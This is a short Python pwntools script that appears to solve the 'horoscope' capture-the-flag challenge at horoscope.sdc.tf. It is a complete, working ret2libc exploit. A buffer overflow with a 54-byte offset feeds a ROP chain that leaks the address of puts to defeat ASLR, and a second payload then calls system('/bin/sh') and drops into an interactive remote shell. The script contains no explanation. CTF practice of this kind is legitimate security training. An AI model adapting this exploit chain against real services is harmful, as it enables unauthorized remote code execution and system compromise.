from pwn import *

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc = ELF('./libc-2.27.so')
elf = ELF('./horoscope')
# p = elf.process()
p = remote('horoscope.sdc.tf', 1337)

offset = 54
pop_rdi = 0x4009e3
ret = pop_rdi + 1

payload = b'1/'
payload += b'a'*offset
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.sym.puts)
payload += p64(elf.sym.main)

p.recv()
p.sendline(payload)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym.puts
print(hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym.system

payload = b'1/'
payload += b'a'*offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.recv()
p.sendline(payload)

p.interactive()